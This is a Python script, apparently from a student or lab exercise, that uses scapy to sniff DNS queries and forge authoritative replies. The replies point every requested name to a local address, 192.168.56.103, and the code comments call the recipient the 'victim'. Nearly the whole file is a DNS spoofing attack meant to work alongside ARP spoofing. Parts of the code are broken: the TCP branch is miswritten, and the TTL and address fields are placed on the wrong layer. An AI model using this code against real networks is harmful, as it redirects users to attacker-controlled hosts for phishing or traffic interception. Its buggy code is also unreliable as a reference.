from scapy.all import *
# import scanning as scan
from sys import argv
import socket

# DNS spoofing will make use of ARP spoofing
#from scapy.layers.dns import DNSQR, UDP, DNS, DNSRR
#from scapy.layers.inet import IP, TCP

""" kan in een losse functie gezet worden, maar eerst kijken of het zo werkt
def alter_packet(d_pkt):
    #als dit niet werkt zet hier [0] achter
    dstIP = d_pkt.getlayer(IP).dst
    srcIP = d_pkt.getlayer(IP).src
    dstPort =
    srcPort =
    new_pkt = "voeg iets samen"
    return new_pkt
"""

def dns_spoof():
    # sniff DNS traffic one at a time
    # , iface=argv[1]
    print("hoi2")
    while 1:
        DNSpkt = sniff(count=1, filter="dst port 53")

        # if it is a DNS request, start with creating response
        if DNSpkt[0].haslayer(scapy.all.DNSQR):
            # ignore this: alter_packet(DNSpkt)
            dstIP = DNSpkt[0].getlayer(scapy.all.IP).dst
            srcIP = DNSpkt[0].getlayer(scapy.all.IP).src

            # check if it is UDP or TCP traffic
            if DNSpkt[0].haslayer(scapy.all.UDP):
                dstPort = DNSpkt[0].getlayer(scapy.all.UDP).dport
                srcPort = DNSpkt[0].getlayer(scapy.all.UDP).sport
            elif DNSpkt[0].haslayer(scapy.all.TCP):
                dstPort = DNSpkt.getlayer[0](scapy.all.TCP).dport
                srcPort = DNSpkt.getlayer[0](scapy.all.TCP).sport

            dnsId = DNSpkt[0].getlayer(scapy.all.DNS).id
            dnsQd = DNSpkt[0].getlayer(scapy.all.DNS).qd

            # retrieve the name of the website that is searched for
            queryName = DNSpkt[0].getlayer(scapy.all.DNS).qd.qname

            # TODO: create website and fill IP address in below
            my_site = '192.168.56.103'

            # create DNS response packet in the form of IP()/UDP()/DNS()

            spoof_response = IP(dst=srcIP, src=dstIP)/\
                             UDP(dport=srcPort, sport=dstPort)/\
                             DNS(id=dnsId, qd=dnsQd, aa=1, qr=1, an=DNSRR(rrname=queryName), ttl=20, rdata=my_site)

            # send packet to victim
            print(spoof_response)
            send(spoof_response)
        # elif: exit??


"""def return_packet():
  
"""























